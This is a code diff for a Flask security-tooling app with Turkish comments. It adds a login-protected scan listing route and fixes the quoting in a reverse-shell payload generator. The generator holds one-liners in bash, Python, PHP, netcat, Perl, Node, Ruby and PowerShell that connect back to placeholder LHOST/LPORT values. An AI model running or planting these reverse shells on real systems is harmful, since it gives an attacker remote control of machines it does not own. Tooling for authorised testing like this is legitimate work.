@@ -15,6 +15,20 @@ from cyberapp.services.queue import enqueue_job
 scans_bp = Blueprint("scans", __name__)
 
 
+@scans_bp.route("/scans")
+def scans_list():
+    """Tüm taramaları listele"""
+    if not session.get("logged_in"):
+        return redirect("/login")
+    
+    with db_conn() as conn:
+        scans = conn.execute(
+            "SELECT * FROM scans ORDER BY id DESC LIMIT 50"
+        ).fetchall()
+    
+    return render_template("scans.html", scans=scans)
+
+
 @scans_bp.route("/scan", methods=["POST"])
 def scan():
     if not session.get("logged_in"):
@@ -174,13 +188,13 @@ def payloads_generator():
 
     payloads_dict = {
         "bash": "bash -i >& /dev/tcp/LHOST/LPORT 0>&1",
-        "python": """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")' """,
-        "php": """php -r '$sock=fsockopen(\"LHOST\",LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");' """,
+        "python": """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' """,
+        "php": """php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");' """,
         "nc": "nc -e /bin/sh LHOST LPORT",
-        "perl": """perl -e 'use Socket;$i=\"LHOST\";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' """,
-        "node": """node -e 'require(\"child_process\").exec(\"bash -i >& /dev/tcp/LHOST/LPORT 0>&1\")' """,
-        "ruby": """ruby -rsocket -e 'c=TCPSocket.new(\"LHOST\",LPORT);while true;cmd=c.gets;system(cmd);c.puts `#{cmd}`;end' """,
-        "powershell": """powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"LHOST\",LPORT);""",
+        "perl": """perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' """,
+        "node": """node -e 'require("child_process").exec("bash -i >& /dev/tcp/LHOST/LPORT 0>&1")' """,
+        "ruby": """ruby -rsocket -e 'c=TCPSocket.new("LHOST",LPORT);while true;cmd=c.gets;system(cmd);c.puts `#{cmd}`;end' """,
+        "powershell": """powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);""",
     }
 
     if request.method == "POST":
